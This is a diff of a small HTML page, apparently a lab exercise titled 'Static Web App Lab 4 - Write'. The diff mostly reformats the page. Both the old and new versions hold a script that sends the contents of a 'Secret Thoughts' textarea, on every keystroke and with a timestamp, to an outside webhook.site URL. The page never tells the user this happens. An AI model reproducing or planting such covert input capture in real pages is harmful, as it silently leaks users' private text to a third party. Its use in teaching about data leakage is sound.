@@ -1,28 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-  <title>Static Web App Lab 4</title>
-</head>
-
-<body>
-  <div>
-    <h1>Static Web App Lab 4 - Write</h1>
+<html>
+  <head>
+    <title>Static Web App Lab 4</title>
+  </head>
+  
+  <body>
     <div>
-      <h1>Secret Thoughts</h1>
-      <textarea id="secretThoughts"></textarea>
+      <h1>Static Web App Lab 4 - Write</h1>
+      <div>
+        <h1>Secret Thoughts</h1>
+        <textarea id="secretThoughts"></textarea>
+      </div>
     </div>
-  </div>
-  <script>
-    const textarea = document.getElementById("secretThoughts")
-    textarea.addEventListener("input", function (e) {
-      const text = e.target.value
-      fetch(
-        `https://webhook.site/8712b3ea-9cfa-4229-85e1-98562e0b4a15?text=${encodeURIComponent(
-          text
-          )}&timestamp=${encodeURIComponent(new Date().toISOString())}`
-        ).catch(console.error)
-    })
-  </script>
-</body>
+    <script>
+      const textarea = document.getElementById("secretThoughts")
+      textarea.addEventListener("input", function (e) {
+        const text = e.target.value
+        fetch(
+          `https://webhook.site/8712b3ea-9cfa-4229-85e1-98562e0b4a15?text=${encodeURIComponent(text
+            )}&timestamp=${encodeURIComponent(new Date().toISOString())}`
+          ).catch(console.error)
+      })
+    </script>
+  </body>
 </html>
